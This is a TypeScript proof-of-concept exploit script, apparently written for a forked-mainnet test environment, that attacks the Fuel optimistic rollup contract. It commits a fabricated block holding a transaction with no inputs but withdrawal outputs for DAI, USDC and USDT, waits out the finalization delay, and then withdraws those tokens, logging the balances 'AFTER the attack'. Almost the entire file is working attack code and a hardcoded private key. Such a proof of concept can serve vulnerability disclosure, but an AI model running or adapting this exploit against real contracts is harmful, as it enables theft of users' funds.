import assert from "assert";
import { BigNumber, Contract, ethers } from "ethers";
import { formatEther, parseUnits } from "ethers/lib/utils";
const utils = require("@fuel-js/utils");
const { combine } = require("@fuel-js/struct");
const fuelTx = require("@fuel-js/protocol/src/transaction");
const protocol = require("@fuel-js/protocol");
const { BlockHeader, RootHeader, merkleTreeRoot } = require("@fuel-js/protocol/src/block");
const TransactionProof = require("./transactionProof");

const fuelAddr = "0x6880f6Fd960D1581C2730a451A22EED1081cfD72";
const artifact = require("./artifacts/Fuel.json");
const fuelAbi = artifact.abi.map((a: string) => (a.startsWith("event") ? a : "function " + a));

const daiAbi = require("./artifacts/dai.json");

const events = require("./artifacts/events.json");

const privKey = "0940ba281251c6b4c6c763b1bb0b866d8812f0ed34a04bd563321f7118407006";
const daiAddr = "0x6B175474E89094C44Da98b954EedeAC495271d0F";
const usdcAddr = "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48";
const usdtAddr = "0xdac17f958d2ee523a2206206994597c13d831ec7";

export async function main() {
  const provider = new ethers.providers.JsonRpcProvider("http://localhost:8545/");
  const signer = new ethers.Wallet(privKey, provider);

  const fuel = new Contract(fuelAddr, fuelAbi, signer);
  const dai = new Contract(daiAddr, daiAbi, signer);
  const usdc = new Contract(usdcAddr, daiAbi, signer);
  const usdt = new Contract(usdtAddr, daiAbi, signer);

  // decrease block delays to enable faster testing in fork mode
  const runtimeCode = await (await provider.getCode(fuel.address)).replace("81ce", "0000").replace("016b76", "000000");
  await provider.send("evm_setAccountCode", [fuel.address, runtimeCode]);

  console.log("submision delay: ", await fuel.SUBMISSION_DELAY());
  console.log("finalization delay: ", await fuel.FINALIZATION_DELAY());

  const txs = [
    await fuelTx.Transaction({
      witnesses: [],
      metadata: [],
      data: [],
      inputs: [],
      signatureFeeToken: 0,
      signatureFee: 0,
      outputs: [
        // DAI
        protocol.outputs.OutputWithdraw({
          amount: parseUnits("6", "ether"),
          owner: signer.address,
          token: "0x01",
        }),
        // USDC
        protocol.outputs.OutputWithdraw({
          amount: 1000000, // 6 decimals for USDC
          owner: signer.address,
          token: "0x02",
        }),
        // USDT
        protocol.outputs.OutputWithdraw({
          amount: 1000000, // 6 decimals for USDT
          owner: signer.address,
          token: "0x03",
        }),
      ],
      chainId: 1,
      fuel,
    }),
  ];

  const root = new RootHeader({
    rootProducer: await signer.getAddress(),
    merkleTreeRoot: merkleTreeRoot(txs),
    commitmentHash: utils.keccak256(combine(txs)),
    rootLength: utils.hexDataLength(combine(txs)),
  });

  await wait(
    fuel.commitRoot(root.properties.merkleTreeRoot().get(), 0, 0, combine(txs), {
      gasLimit: "0x3d0900",
    }),
    "commitRoot",
  );

  // we need to wait "SUBMISSION_DELAY" blocks to commit block
  const blocksDelay = (await fuel.SUBMISSION_DELAY()).toNumber();
  await mineBlocks(provider, blocksDelay);

  const currentBlock = await provider.getBlockNumber();
  const currentBlockHash = (await provider.getBlock(currentBlock)).hash;
  const fuelTip = (await fuel.blockTip()).add(1);

  const header = new BlockHeader({
    producer: signer.address,
    height: fuelTip,
    numTokens: (await fuel.numTokens()).toNumber(),
    numAddresses: (await fuel.numAddresses()).toNumber(),
    roots: [root.keccak256Packed()],
  });

  const block = await wait(
    fuel.commitBlock(currentBlock, currentBlockHash, fuelTip, [root.keccak256Packed()], {
      value: await fuel.BOND_SIZE(),
      gasLimit: "0x3d0900",
    }),
    "commitBlock",
  );
  header.properties.blockNumber().set(block.events[0].blockNumber);
  header.properties.previousBlockHash().set(await fuel.blockCommitment(fuelTip.sub(1)));

  //we need to wait "FINALIZATION_DELAY" blocks to process withdrawals
  const finDelay = (await fuel.FINALIZATION_DELAY()).toNumber();
  await mineBlocks(provider, finDelay);

  const proof = new TransactionProof({
    block: header,
    root: root,
    transactions: txs,
    data: null,
    transactionIndex: 0,
    signatureFee: 0,
    signatureFeeToken: 0,
    selector: signer.address,
    inputProofs: [],
    inputOutputIndex: 0,
    token: daiAddr,
  });
  await wait(fuel.withdraw(proof.encodePacked(), { gasLimit: "0x3d0900" }), "withdraw");

  const proof2 = new TransactionProof({
    block: header,
    root: root,
    transactions: txs,
    data: null,
    transactionIndex: 0,
    signatureFee: 0,
    signatureFeeToken: 0,
    selector: signer.address,
    inputProofs: [],
    inputOutputIndex: 1,
    token: usdcAddr,
  });
  await wait(fuel.withdraw(proof2.encodePacked(), { gasLimit: "0x3d0900" }), "withdraw");

  const proof3 = new TransactionProof({
    block: header,
    root: root,
    transactions: txs,
    data: null,
    transactionIndex: 0,
    signatureFee: 0,
    signatureFeeToken: 0,
    selector: signer.address,
    inputProofs: [],
    inputOutputIndex: 2,
    token: usdtAddr,
  });
  await wait(fuel.withdraw(proof3.encodePacked(), { gasLimit: "0x3d0900" }), "withdraw");

  console.log("DAI balance AFTER the attack: ", (await dai.balanceOf(signer.address)).toString());
  console.log("USDC balance AFTER the attack: ", (await usdc.balanceOf(signer.address)).toString());
  console.log("USDT balance AFTER the attack: ", (await usdt.balanceOf(signer.address)).toString());

  console.log("DONE");
}

main().catch((e) => {
  console.error("Error occured: ", e);
  process.exit(1);
});

function formatArgs(args: any) {
  return Object.entries(args)
    .map(([k, v]) => {
      if (v instanceof BigNumber) {
        return [k, v.toString()];
      }
      if (v instanceof Object) {
        return JSON.stringify(v);
      }
      return [k, v];
    })
    .filter(([k, v]) => {
      return !isNaN(k as any);
    })
    .map((a) => a[1])
    .join(", ");
}

async function forwardTime(provider: ethers.providers.JsonRpcProvider, secs: BigNumber) {
  console.log("Forwarding time...");
  await provider.send("evm_increaseTime", [secs.toNumber()]);
}

async function mineBlocks(provider: ethers.providers.JsonRpcProvider, delay: number) {
  console.log(`Mining ${delay} blocks`);
  for (let i = 0; i < delay; i++) {
    console.log(`Block ${i} mined...`);
    await provider.send("evm_mine", []);
  }
}

async function wait(_tx: any, what: string) {
  const tx = await _tx;
  console.log(`tx ${what} hash:  ${tx.hash}`);
  return await tx.wait();
}
